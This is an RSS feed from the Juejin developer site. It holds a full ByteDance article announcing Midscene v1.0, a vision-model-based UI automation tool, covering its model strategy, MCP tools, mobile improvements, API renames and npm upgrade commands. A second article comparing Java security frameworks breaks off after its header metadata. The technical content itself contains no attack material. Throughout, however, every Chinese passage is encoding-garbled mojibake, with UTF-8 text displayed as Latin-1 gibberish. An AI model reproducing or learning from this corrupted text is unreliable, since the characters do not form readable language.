<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>æ˜é‡‘æ–‡ç« æ¨è</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>ä¸€ä¸ªå¸®åŠ©å¼€å‘è€…æˆé•¿çš„ç¤¾åŒº</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[Midscene v1.0 å‘å¸ƒ - è§†è§‰é©±åŠ¨ï¼ŒUI è‡ªåŠ¨åŒ–ä½“éªŒè·ƒè¿]]></title>    <link>https://juejin.cn/post/7589093895326777353</link>    <guid>https://juejin.cn/post/7589093895326777353</guid>    <pubDate>2025-12-29T11:15:53.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589093895326777353" data-draft-id="7589082912588677163" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Midscene v1.0 å‘å¸ƒ - è§†è§‰é©±åŠ¨ï¼ŒUI è‡ªåŠ¨åŒ–ä½“éªŒè·ƒè¿"/> <meta itemprop="keywords" content="å‰ç«¯,å®¢æˆ·ç«¯,äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2025-12-29T11:15:53.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å­—èŠ‚è·³åŠ¨å¼€æº"/> <meta itemprop="url" content="https://juejin.cn/user/1227510999971086"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Midscene v1.0 å‘å¸ƒ - è§†è§‰é©±åŠ¨ï¼ŒUI è‡ªåŠ¨åŒ–ä½“éªŒè·ƒè¿
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1227510999971086/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å­—èŠ‚è·³åŠ¨å¼€æº
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T11:15:53.000Z" title="Mon Dec 29 2025 11:15:53 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>æ–‡ç« æ¥æºï½œByteDance Web Infra å›¢é˜Ÿ</p>
</blockquote>
<p>Midscene è‡ª 2024 å¹´å¼€æºå‘å¸ƒä»¥æ¥ï¼Œå·²ç»åœ¨ Github æ–©è· 11k star ã€Trending æ¦œç¬¬äºŒåç­‰æˆç»©ï¼Œå¹¶åœ¨äº’è”ç½‘ã€é‡‘èã€æ”¿ä¼ã€æ±½è½¦ç­‰å¤§é‡åº”ç”¨åœºæ™¯ä¸‹å®Œæˆè½åœ°ã€‚</p>
<p>æœ¬æœˆï¼Œæˆ‘ä»¬æ­£å¼å®£å¸ƒ Midscene v1.0 å‘å¸ƒï¼æœ¬æ–‡å°†ä¸ºä½ ä»‹ç»ï¼š</p>
<ul>
<li>æ¡ˆä¾‹å›é¡¾ï¼šMidscene åœ¨ PCã€Androidã€iOS ç­‰åœºæ™¯çš„ä»»åŠ¡èƒ½åŠ›ï¼›</li>
<li>ç¤¾åŒºæ¡ˆä¾‹ï¼šç¤¾åŒºå¼€å‘è€…åŸºäº Midscene ä¸ä»»æ„ç•Œé¢é›†æˆçš„ç‰¹æ€§ï¼Œæ‰©å±•äº†æœºæ¢°è‡‚ + è§†è§‰æ¨¡å‹ + è¯­éŸ³æ¨¡å‹ç­‰æ¨¡å—ï¼Œå®Œæˆè½¦æœºæµ‹è¯•ï¼›</li>
<li>1.0 ç‰ˆæœ¬çš„æ¨¡å‹è·¯çº¿ï¼šæ‹¥æŠ±çº¯è§†è§‰ï¼›</li>
<li>1.0 ç‰ˆæœ¬çš„ç‰¹æ€§ä¼˜åŒ–ï¼šæŠ¥å‘Šä¼˜åŒ–ã€MCP æ¶æ„ã€è·¨ç«¯å¢å¼ºã€API å˜æ›´ç­‰ã€‚</li>
</ul>
<h2 data-id="heading-0">æ¡ˆä¾‹å›é¡¾</h2>
<h4 data-id="heading-1">ç¤¾åŒºæ¡ˆä¾‹ï¼šè§†è§‰æ¨¡å‹ + æœºæ¢°è‡‚</h4>
<p>æ¼”ç¤ºè§†é¢‘è¯·åœ¨å…¬ä¼—å·æŸ¥çœ‹ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F24rFtAfihEos6f1u83jeLg" target="_blank" title="https://mp.weixin.qq.com/s/24rFtAfihEos6f1u83jeLg" ref="nofollow noopener noreferrer">mp.weixin.qq.com/s/24rFtAfihâ€¦</a></p>
<p>æœ‰ç¤¾åŒºå¼€å‘è€…æˆåŠŸåŸºäº Midscene ä¸ä»»æ„ç•Œé¢é›†æˆçš„ç‰¹æ€§ï¼Œæ‰©å±•äº†æœºæ¢°è‡‚ + è§†è§‰æ¨¡å‹ + è¯­éŸ³æ¨¡å‹ç­‰æ¨¡å—ï¼Œè¿ç”¨äºè½¦æœºå¤§å±æµ‹è¯•åœºæ™¯ä¸­ã€‚</p>
<h4 data-id="heading-2">ç§»åŠ¨ç«¯æ¡ˆä¾‹ï¼šå¤–å–ä¸‹å•</h4>
<p>æ‰“å¼€ç¾å›¢ï¼Œå¸®æˆ‘ä¸‹å•ä¸€æ¯ manner è¶…å¤§æ¯å†°ç¾å¼å’–å•¡ï¼Œè¦åŠ æµ“å°‘å†°å–”ï¼Œåˆ°ç»“ç®—é¡µé¢è®©æˆ‘ç¡®è®¤ã€‚</p>
<p>æ¼”ç¤ºè§†é¢‘è¯·åœ¨å…¬ä¼—å·æŸ¥çœ‹ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F24rFtAfihEos6f1u83jeLg" target="_blank" title="https://mp.weixin.qq.com/s/24rFtAfihEos6f1u83jeLg" ref="nofollow noopener noreferrer">mp.weixin.qq.com/s/24rFtAfihâ€¦</a></p>
<p>åœ¨æˆ‘ä»¬çš„ Midscene å®˜ç½‘ä¸Šï¼Œè¿˜æœ‰æ›´å¤šå®æˆ˜æ¡ˆä¾‹ï¼š</p>
<ol>
<li>iOS è‡ªåŠ¨åŒ– - Twitter è‡ªåŠ¨ç‚¹èµ @midscene_ai é¦–æ¡æ¨æ–‡ï¼›</li>
<li>Android è‡ªåŠ¨åŒ– - æ‡‚è½¦å¸æŸ¥çœ‹å°ç±³ SU7 å‚æ•°ï¼›</li>
<li>Android è‡ªåŠ¨åŒ– - Booking é¢„è®¢åœ£è¯é…’åº—ï¼›</li>
<li>MCP é›†æˆ - Midscene MCP æ“ä½œç•Œé¢å‘å¸ƒ prepatch ç‰ˆæœ¬ã€‚</li>
</ol>
<h2 data-id="heading-3">1.0 ç‰ˆæœ¬çš„æ¨¡å‹è·¯çº¿</h2>
<p>ä» V1.0 å¼€å§‹ï¼ŒMidscene å…¨é¢è½¬å‘è§†è§‰ç†è§£æ–¹æ¡ˆï¼Œæä¾›æ›´ç¨³å®šå¯é çš„ UI è‡ªåŠ¨åŒ–èƒ½åŠ›ã€‚</p>
<p>è§†è§‰æ¨¡å‹æœ‰ä»¥ä¸‹ç‰¹ç‚¹ï¼š</p>
<ul>
<li>
<p><strong>æ•ˆæœç¨³å®š</strong>Â ï¼šä¸šç•Œé¢†å…ˆçš„è§†è§‰æ¨¡å‹ï¼ˆå¦‚ Doubao Seed 1.6ã€Qwen3-VL ç­‰ï¼‰è¡¨ç°è¶³å¤Ÿç¨³å®šï¼Œå·²ç»å¯ä»¥æ»¡è¶³å¤§å¤šæ•°ä¸šåŠ¡éœ€æ±‚ï¼›</p>
</li>
<li>
<p><strong>UI æ“ä½œè§„åˆ’</strong>Â ï¼šè§†è§‰æ¨¡å‹é€šå¸¸å…·å¤‡è¾ƒå¼ºçš„ UI æ“ä½œè§„åˆ’èƒ½åŠ›ï¼Œèƒ½å¤Ÿå®Œæˆä¸å°‘å¤æ‚çš„ä»»åŠ¡æµç¨‹ï¼›</p>
</li>
<li>
<p><strong>é€‚ç”¨äºä»»æ„ç³»ç»Ÿ</strong>Â ï¼šè‡ªåŠ¨åŒ–æ¡†æ¶ä¸å†ä¾èµ– UI æ¸²æŸ“çš„æŠ€æœ¯æ ˆï¼Œæ— è®ºæ˜¯ Androidã€iOSã€æ¡Œé¢åº”ç”¨ï¼Œè¿˜æ˜¯æµè§ˆå™¨ä¸­çš„Â <code>&lt;canvas&gt;</code>ï¼Œåªè¦èƒ½è·å–æˆªå›¾ï¼ŒMidscene å³å¯å®Œæˆäº¤äº’æ“ä½œï¼›</p>
</li>
<li>
<p><strong>æ˜“äºç¼–å†™</strong>Â ï¼šæŠ›å¼ƒå„ç±» selector å’Œ DOM ä¹‹åï¼Œå¼€å‘è€…ä¸æ¨¡å‹çš„â€œç£¨åˆâ€ä¼šå˜å¾—æ›´ç®€å•ï¼Œä¸ç†Ÿæ‚‰æ¸²æŸ“æŠ€æœ¯çš„æ–°äººä¹Ÿèƒ½å¾ˆå¿«ä¸Šæ‰‹ï¼›</p>
</li>
<li>
<p><strong>token é‡æ˜¾è‘—ä¸‹é™</strong>Â ï¼šåœ¨å»é™¤ DOM æå–ä¹‹åï¼Œè§†è§‰æ–¹æ¡ˆçš„ token ä½¿ç”¨é‡å¯ä»¥å‡å°‘ 80%ï¼Œæˆæœ¬æ›´ä½ï¼Œä¸”æœ¬åœ°è¿è¡Œé€Ÿåº¦ä¹Ÿå˜å¾—æ›´å¿«</p>
</li>
<li>
<p><strong>æœ‰å¼€æºæ¨¡å‹è§£å†³æ–¹æ¡ˆ</strong>Â ï¼šå¼€æºæ¨¡å‹è¡¨ç°æ¸ä½³ï¼Œå¼€å‘è€…å¼€å§‹æœ‰æœºä¼šè¿›è¡Œç§æœ‰åŒ–éƒ¨ç½²æ¨¡å‹ï¼Œå¦‚ Qwen3-VL æä¾›çš„ 8Bã€30B ç­‰ç‰ˆæœ¬åœ¨ä¸å°‘é¡¹ç›®ä¸­éƒ½æœ‰ç€ä¸é”™çš„æ•ˆæœã€‚</p>
</li>
</ul>
<p>è¯¦æƒ…è¯·é˜…è¯»æˆ‘ä»¬æ›´æ–°ç‰ˆçš„<strong>æ¨¡å‹ç­–ç•¥[1]ã€‚</strong></p>
<h2 data-id="heading-4">ğŸš€Â å¤šæ¨¡å‹ç»„åˆï¼Œä¸ºå¤æ‚ä»»åŠ¡å¸¦æ¥æ›´å¥½æ•ˆæœ</h2>
<p>é™¤äº†é»˜è®¤çš„äº¤äº’åœºæ™¯ï¼ŒMidscene è¿˜å®šä¹‰äº† Planningï¼ˆè§„åˆ’ï¼‰å’Œ Insightï¼ˆæ´å¯Ÿï¼‰ä¸¤ç§æ„å›¾ï¼Œå¼€å‘è€…å¯ä»¥æŒ‰éœ€ä¸ºå®ƒä»¬å¯ç”¨ç‹¬ç«‹çš„æ¨¡å‹ã€‚ä¾‹å¦‚ï¼Œç”¨ GPT æ¨¡å‹åšè§„åˆ’ï¼ŒåŒæ—¶ä½¿ç”¨é»˜è®¤çš„ Doubao æ¨¡å‹åšå…ƒç´ å®šä½ã€‚</p>
<p>å¤šæ¨¡å‹ç»„åˆè®©å¼€å‘è€…å¯ä»¥æŒ‰éœ€æå‡å¤æ‚éœ€æ±‚çš„å¤„ç†èƒ½åŠ›ã€‚</p>
<h2 data-id="heading-5">ğŸš€ è¿è¡Œæ—¶æ¶æ„ä¼˜åŒ–</h2>
<p>é’ˆå¯¹ Midscene çš„è¿è¡Œæ—¶è¡¨ç°ï¼Œæˆ‘ä»¬è¿›è¡Œäº†ä»¥ä¸‹ä¼˜åŒ–ï¼š</p>
<ul>
<li>å‡å°‘å¯¹è®¾å¤‡ä¿¡æ¯æ¥å£çš„è°ƒç”¨ï¼Œåœ¨ç¡®ä¿å®‰å…¨çš„æƒ…å†µä¸‹å¤ç”¨éƒ¨åˆ†ä¸Šä¸‹æ–‡ä¿¡æ¯ï¼Œæå‡è¿è¡Œæ—¶æ€§èƒ½ï¼Œè®©å¤§å¤šæ•°çš„æ—¶é—´æ¶ˆè€—é›†ä¸­åœ¨æ¨¡å‹ç«¯ï¼›</li>
<li>ä¼˜åŒ– Web åŠç§»åŠ¨ç«¯ç¯å¢ƒä¸‹çš„ Action Space ç»„åˆï¼Œå‘æ¨¡å‹å¼€æ”¾æ›´åˆç†ã€æ›´æ¸…æ™°çš„å·¥å…·é›†ã€‚</li>
</ul>
<h2 data-id="heading-6">ğŸš€ å›æ”¾æŠ¥å‘Šä¼˜åŒ–</h2>
<p>å›æ”¾æŠ¥å‘Šæ˜¯ Midscene å¼€å‘è€…éå¸¸ä¾èµ–çš„ä¸€ä¸ªç‰¹æ€§ï¼Œå®ƒèƒ½æœ‰æ•ˆæå‡è„šæœ¬çš„è°ƒè¯•æ•ˆç‡ã€‚</p>
<p>åœ¨ v1.0 ä¸­ï¼Œæˆ‘ä»¬æ›´æ–°äº†å›æ”¾æŠ¥å‘Šï¼š</p>
<ul>
<li>å‚æ•°è§†å›¾ï¼šæ ‡è®°å‡ºäº¤äº’å‚æ•°çš„ä½ç½®ä¿¡æ¯ï¼Œåˆå¹¶æˆªå›¾ä¿¡æ¯ï¼Œå¿«é€Ÿè¯†åˆ«æ¨¡å‹çš„è§„åˆ’ç»“æœï¼›</li>
<li>æ ·å¼è°ƒæ•´ï¼šæ”¯æŒä»¥æ·±è‰²æ¨¡å¼å±•ç¤ºæŠ¥å‘Šï¼Œæ›´ç¾è§‚ï¼›</li>
<li>Token æ¶ˆè€—çš„å±•ç¤ºï¼šæ”¯æŒæŒ‰æ¨¡å‹æ±‡æ€» Token æ¶ˆè€—é‡ï¼Œåˆ†æä¸åŒåœºæ™¯çš„æˆæœ¬æƒ…å†µã€‚</li>
</ul>
<h2 data-id="heading-7">ğŸš€ MCP æ¶æ„é‡æ„</h2>
<p>æˆ‘ä»¬é‡æ–°å®šä¹‰äº† Midscene MCP æœåŠ¡çš„å®šä½ã€‚Midscene MCP çš„èŒè´£æ˜¯å›´ç»•ç€è§†è§‰é©±åŠ¨çš„ UI æ“ä½œå±•å¼€ï¼Œå°† iOS / Android / Web è®¾å¤‡ Action Space ä¸­çš„æ¯ä¸ª Action æ“ä½œæš´éœ²ä¸º MCP å·¥å…·ï¼Œä¹Ÿå°±æ˜¯æä¾›å„ç±»â€œåŸå­æ“ä½œâ€ã€‚</p>
<p>é€šè¿‡è¿™ç§å½¢å¼ï¼Œå¼€å‘è€…å¯ä»¥æ›´ä¸“æ³¨äºæ„å»ºè‡ªå·±çš„é«˜é˜¶ Agentï¼Œè€Œæ— éœ€å…³å¿ƒåº•å±‚ UI æ“ä½œçš„å®ç°ç»†èŠ‚ï¼Œå¹¶ä¸”æ—¶åˆ»è·å¾—æ»¡æ„çš„æˆåŠŸç‡ã€‚</p>
<p>è¯¦æƒ…è¯·é˜…è¯»Â <strong>MCP æ–‡æ¡£[2]ã€‚</strong></p>
<h2 data-id="heading-8">ğŸš€ ç§»åŠ¨ç«¯èƒ½åŠ›å¢å¼º</h2>
<p><strong>iOS æ”¹è¿›</strong></p>
<ul>
<li>
<p>æ–°å¢ WebDriverAgent 5.x-7.x å…¨ç‰ˆæœ¬å…¼å®¹ï¼›</p>
</li>
<li>
<p>æ–°å¢ WebDriver Clear API æ”¯æŒï¼Œè§£å†³åŠ¨æ€è¾“å…¥æ¡†é—®é¢˜ï¼›</p>
</li>
<li>
<p>æå‡è®¾å¤‡å…¼å®¹æ€§ã€‚</p>
</li>
</ul>
<p><strong>Android æ”¹è¿›</strong></p>
<ul>
<li>
<p>æ–°å¢æˆªå›¾è½®è¯¢å›é€€æœºåˆ¶ï¼Œæå‡è¿œç¨‹è®¾å¤‡ç¨³å®šæ€§ï¼›</p>
</li>
<li>
<p>æ–°å¢å±å¹•æ–¹å‘è‡ªåŠ¨é€‚é…ï¼ˆdisplayId æˆªå›¾ï¼‰ï¼›</p>
</li>
<li>
<p>æ–°å¢ YAML è„šæœ¬Â <code>runAdbShell</code>Â æ”¯æŒã€‚</p>
</li>
</ul>
<p><strong>è·¨å¹³å°</strong></p>
<ul>
<li>åœ¨ Agent å®ä¾‹ä¸Šæš´éœ²ç³»ç»Ÿæ“ä½œæ¥å£ï¼ŒåŒ…æ‹¬ Homeã€Backã€RecentApp ç­‰ã€‚</li>
</ul>
<h2 data-id="heading-9">ğŸš§ API å˜æ›´</h2>
<p>æ–¹æ³•é‡å‘½åï¼ˆå‘åå…¼å®¹ï¼‰ï¼š</p>
<ul>
<li>
<p>æ”¹åÂ <code>aiAction()</code>Â â†’Â <code>aiAct()</code>ï¼ˆæ—§æ–¹æ³•ä¿ç•™ï¼Œæœ‰å¼ƒç”¨è­¦å‘Šï¼‰ï¼›</p>
</li>
<li>
<p>æ”¹åÂ <code>logScreenshot()</code>Â â†’Â <code>recordToReport()</code>ï¼ˆæ—§æ–¹æ³•ä¿ç•™ï¼Œæœ‰å¼ƒç”¨è­¦å‘Šï¼‰ã€‚</p>
</li>
</ul>
<p>ç¯å¢ƒå˜é‡é‡å‘½åï¼ˆå‘åå…¼å®¹ï¼‰ï¼š</p>
<ul>
<li>æ”¹åÂ <code>OPENAI_API_KEY</code>Â â†’Â <code>MODEL_API_KEY</code>ï¼ˆæ–°å˜é‡ä¼˜å…ˆï¼Œæ—§å˜é‡ä½œä¸ºå¤‡é€‰ï¼‰ï¼›</li>
<li>æ”¹åÂ <code>OPENAI_BASE_URL</code>Â â†’Â <code>MODEL_BASE_URL</code>ï¼ˆæ–°å˜é‡ä¼˜å…ˆï¼Œæ—§å˜é‡ä½œä¸ºå¤‡é€‰ï¼‰ã€‚</li>
</ul>
<h2 data-id="heading-10">â¬†ï¸ å‡çº§åˆ°æœ€æ–°ç‰ˆ</h2>
<p>å‡çº§é¡¹ç›®ä¸­çš„ä¾èµ–ï¼Œä¾‹å¦‚ï¼š</p>
<ul>
<li>
<p><code>npm install @midscene/web@latest --save-dev</code>ï¼›</p>
</li>
<li>
<p><code>npm install @midscene/android@latest --save-dev</code>ï¼›</p>
</li>
<li>
<p><code>npm install @midscene/ios@latest --save-dev</code>ã€‚</p>
</li>
</ul>
<p>å¦‚æœä½¿ç”¨å…¨å±€å®‰è£…çš„å‘½ä»¤è¡Œç‰ˆæœ¬ï¼š<code>npm i -g @midscene/cli</code>ã€‚</p>
<p><strong>äº†è§£æ›´å¤š</strong></p>
<ul>
<li>
<p>Midscene.js <a href="https://link.juejin.cn?target=https%3A%2F%2Fmidscenejs.com%2F" title="https://midscenejs.com/" target="_blank" ref="nofollow noopener noreferrer">midscenejs.com</a></p>
</li>
<li>
<p>Github <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fweb-infra-dev%2Fmidscene" title="https://github.com/web-infra-dev/midscene" target="_blank" ref="nofollow noopener noreferrer">github.com/web-infra-dâ€¦</a></p>
</li>
<li>
<p>1.0 ç‰ˆæœ¬ Changelog <a href="https://link.juejin.cn?target=https%3A%2F%2Fmidscenejs.com%2Fzh%2Fchangelog.html" title="https://midscenejs.com/zh/changelog.html" target="_blank" ref="nofollow noopener noreferrer">midscenejs.com/zh/changeloâ€¦</a></p>
</li>
</ul>
<p><strong>å‚è€ƒèµ„æ–™</strong></p>
<p>[1]Â æ¨¡å‹ç­–ç•¥:Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fmidscenejs.com%2Fzh%2Fmodel-strategy" target="_blank" title="https://midscenejs.com/zh/model-strategy" ref="nofollow noopener noreferrer"><em>https://midscenejs.com/zh/model-strategy</em></a></p>
<p>[2]Â MCP æ–‡æ¡£:Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fmidscenejs.com%2Fzh%2Fmcp" target="_blank" title="https://midscenejs.com/zh/mcp" ref="nofollow noopener noreferrer"><em>https://midscenejs.com/zh/mcp</em></a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[SpringSecurityã€shiro å’Œ sa-tokenï¼Œåˆ°åº•é€‰å“ªä¸ªï¼Ÿ]]></title>    <link>https://juejin.cn/post/7589052659436077102</link>    <guid>https://juejin.cn/post/7589052659436077102</guid>    <pubDate>2025-12-29T11:40:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589052659436077102" data-draft-id="7589107312112795657" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="SpringSecurityã€shiro å’Œ sa-tokenï¼Œåˆ°åº•é€‰å“ªä¸ªï¼Ÿ"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-12-29T11:40:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è‹ä¸‰è¯´æŠ€æœ¯"/> <meta itemprop="url" content="https://juejin.cn/user/465848661970824"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            SpringSecurityã€shiro å’Œ sa-tokenï¼Œåˆ°åº•é€‰å“ªä¸ªï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/465848661970824/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è‹ä¸‰è¯´æŠ€æœ¯
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T11:40:00.000Z" title="Mon Dec 29 2025 11:40:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»16åˆ†é’Ÿ
